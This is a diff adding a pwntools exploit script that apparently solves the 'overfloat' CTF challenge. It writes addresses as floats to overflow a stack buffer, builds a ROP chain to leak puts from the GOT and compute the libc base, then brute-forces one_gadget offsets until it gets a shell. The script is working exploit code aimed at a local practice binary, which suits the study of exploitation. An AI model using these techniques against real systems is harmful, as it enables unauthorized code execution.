@@ -1,0 +1,66 @@
+from pwn import *
+import struct
+
+# interesting to know how computer store floating point numbers in x86
+# support tool: https://stackoverflow.com/questions/5415/convert-bytes-to-floating-point-numbers
+
+#p = process("./overfloat_patched")
+'''
+p = gdb.debug("./overfloat_patched", gdbscript = 
+b *main + 139
+)
+'''
+
+e = ELF("./overfloat_patched")
+libc = ELF("./libc-2.27.so")
+
+def send_data(addr):
+    val = addr & 0xffffffff
+    p.sendlineafter(b"]: ", str(struct.unpack('f', p32(val))[0]).encode())
+    val = addr >> 32
+    p.sendlineafter(b"]: ", str(struct.unpack('f', p32(val))[0]).encode())
+
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+pop_rdi = 0x0000000000400a83
+main = e.symbols['main']
+one_shot = [0x4f2be, 0x4f2c5, 0x4f322, 0x10a38c]
+
+for test in range(4):
+    p = process("./overfloat_patched")
+
+    for i in range(6):
+        send_data(0x4141414141414141)
+    send_data(0x4242424242424242)
+
+    send_data(pop_rdi)
+    send_data(puts_got)
+    send_data(puts_plt)
+    send_data(main)
+    p.sendlineafter(b"]: ", b"done")
+
+    p.recvuntil(b"BON VOYAGE!\n")
+    libc_base = u64(p.recvline()[:-1:] + b"\x00" * 2) - libc.symbols['puts']
+    print(hex(libc_base))
+    
+    for i in range(6):
+        send_data(0x4141414141414141)
+    send_data(0x4242424242424242)
+    
+    print(hex(libc_base + one_shot[test]))
+    send_data(libc_base + one_shot[test])
+    p.sendlineafter(b"]: ", b"done")
+    p.recvuntil(b"BON VOYAGE!\n")
+    
+    try:
+        p.sendline(b"echo vani5hing")
+        p.recvuntil("vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+    
+p.interactive()
+
